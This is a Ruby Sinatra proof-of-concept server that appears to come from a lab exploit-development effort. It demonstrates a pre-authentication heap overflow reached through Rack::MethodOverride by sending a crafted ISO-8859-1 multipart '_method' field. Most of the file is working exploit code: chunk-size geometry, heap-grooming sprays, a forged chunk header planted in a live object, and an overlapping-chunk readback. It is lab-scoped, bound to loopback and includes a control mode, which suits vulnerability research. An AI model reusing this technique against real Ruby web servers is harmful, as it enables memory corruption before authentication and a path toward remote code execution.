# Stage B over HTTP — rung-4 geometry, request-reachable trigger.
#
# Sink (default stack, no app code on the trigger path): classic Sinatra
# mounts Rack::MethodOverride; it upcases the `_method` form param
# (rack/method_override.rb: method.to_s.upcase). In a multipart form,
# Rack honors a per-part `charset` on text/plain parts
# (rack/multipart/parser.rb: tag_multipart_encoding -> body.force_encoding).
# A POST whose `_method` part declares charset=ISO-8859-1 and carries
# 21+ 0xDF bytes drives the vulnerable ISO-8859-1 case_map loop with
# attacker-controlled bytes and length — before routing, CSRF and auth.
#
# Grooming (ours, honestly labeled; in a real attack it would be
# request-shaped) runs INSIDE the trigger request: GroomMiddleware is
# mounted outside Sinatra, so it runs before Rack::MethodOverride, and
# cross-request server noise cannot sit on top of the layout the way
# it did when /groom was a separate request (first attempt aborted:
# buffer1 popped a recycled boot chunk instead of S; evidence
# stageB-http-1.{trace,out}, `malloc(): invalid next size (unsorted)`).
#
# Geometry (identical to lab/repro/ruby2shell-stageB.rb, in-process):
#   [S 0x370][V 0x430][W 0x460 live][dummy 0x360] from top after class
#   drains; free S,V,dummy + GC.start -> V in unsorted, S/dummy tcache.
#   Trigger body: multipart `_method` part "a"+0xDF*827 (N=828)
#   ISO-8859-1: buffer1 request 872 -> 0x370 pops S, ONE 0x53 lands on
#   V's size LSB (0x431->0x453); result malloc(1656) walks unsorted and
#   bins V at 0x450. /mark then allocates "m"*1080 (chunk 0x450 exact
#   fit) -> V returned overlapping W; readback over the live object.
#   CONTROL (STAGEB_CONTROL=1 at server launch): the driver sends pure
#   0xDF*828 — same buffers, no parity flip, NO overflow.
#
# Loopback only: bind 127.0.0.1.
gem 'sinatra', '4.2.2'
gem 'rack', '3.2.8'
gem 'rackup', '2.3.1'
gem 'webrick', '1.9.2'
require 'sinatra'

$w_live = nil
$drains = nil
$readback = nil
$control = !ENV['STAGEB_CONTROL'].nil?

class GroomMiddleware
  def initialize(app)
    @app = app
  end

  def groom!
    GC.start
    $drains = [
      Array.new(512) { "e" * 840 },   # request 841 -> 0x360
      Array.new(512) { "d" * 856 },   # request 857 -> 0x370
      Array.new(512) { "v" * 1048 },  # request 1049 -> 0x430
      Array.new(512) { "w" * 1096 },  # request 1097 -> 0x460
    ]
    w_content = ("W" * 16) +
                "\x50\x04\x00\x00\x00\x00\x00\x00" + # fake prev_size 0x450
                "\x90\x00\x00\x00\x00\x00\x00\x00" + # fake size 0x90, prev_inuse clear
                ("A" * 1064)
    s_chunk = "d" * 856    # S 0x370, tcache later
    v_chunk = "v" * 1048   # V 0x430, unsorted later
    $w_live = w_content + "" # W 0x460, stays live (copy, not COW dup)
    dummy   = "e" * 840     # 0x360, tcache later (buffer2 stock)
    v_chunk = nil; s_chunk = nil; dummy = nil; w_content = nil
    # Clobber stale stack/register slots before the sweep: without these
    # calls the last-created dummy string survives GC.start (conservative
    # marking of the machine stack; isolated repro /tmp/groomtest.rb vs
    # /tmp/groomtest2.rb), leaving tcache[0x360] unstocked so the upcase's
    # buffer2 splits unsorted V (trace stageB-http-1: M 0 352 at V's
    # address).
    scrub; scrub; scrub
    GC.start # V -> unsorted; S -> tcache[0x370]; dummy -> tcache[0x360]
  end

  def scrub
    nil
  end

  def call(env)
    if env['REQUEST_METHOD'] == 'POST' && env['PATH_INFO'] == '/trigger'
      # Force the multipart parse FIRST: without this, Rack::MethodOverride
      # parses between our groom and its upcase, and a parse allocation
      # (observed: malloc 0x210, trace stageB-http-1) splits unsorted V.
      # The parsed form hash is cached in env (RACK_REQUEST_FORM_HASH), so
      # MethodOverride's req.POST does not re-parse.
      begin
        Rack::Request.new(env).POST
      rescue StandardError
      end
      groom!
    end
    @app.call(env)
  end
end

# Runs INSIDE Sinatra's user-middleware chain — on the request path this
# is immediately after Rack::MethodOverride (Sinatra mounts its default
# middleware, incl. MethodOverride, outside user middleware). The
# upcase result-malloc has just binned inflated V (0x450) in the
# largebin; this is the FIRST 0x450-class malloc after that, so the
# marker takes V (exact fit) before any server allocation can pop and
# free it (a popped-then-freed V aborts: the corrupted size LSB 0x53
# or 0x73 always has IS_MMAPPED set -> munmap_chunk).
class MarkerMiddleware
  def initialize(app)
    @app = app
  end

  def call(env)
    if env['REQUEST_METHOD'] == 'POST' && env['PATH_INFO'] == '/trigger'
      ov = "m" * 1080        # malloc(1081): chunk 0x450 exact fit -> V
      $readback = $w_live.byteslice(0, 32).unpack1('H*')
      $keep = ov             # keep live: freeing it would munmap-abort
    end
    @app.call(env)
  end
end

use MarkerMiddleware # user middleware: request-path position right after Rack::MethodOverride
set :show_exceptions, false

before do
  content_type 'text/plain'
end

post '/trigger' do
  # Route body is a no-op on the attack path: the overflow happens in
  # Rack::MethodOverride, the marker take in MarkerMiddleware, both
  # before this route is reached. The readback below was captured over
  # the LIVE W object.
  "triggered control=#{$control} W-readback-hex=#{$readback}\n"
end

get '/mark' do
  "W-readback-hex=#{$readback}\n"
end

require 'rackup/handler/webrick'
Sinatra::Application.set(:run, false) # suppress classic auto-run; we mount
app = GroomMiddleware.new(Sinatra::Application.new) # groom OUTSIDE Sinatra
Rackup::Handler::WEBrick.run(app, Host: '127.0.0.1', Port: 4547)
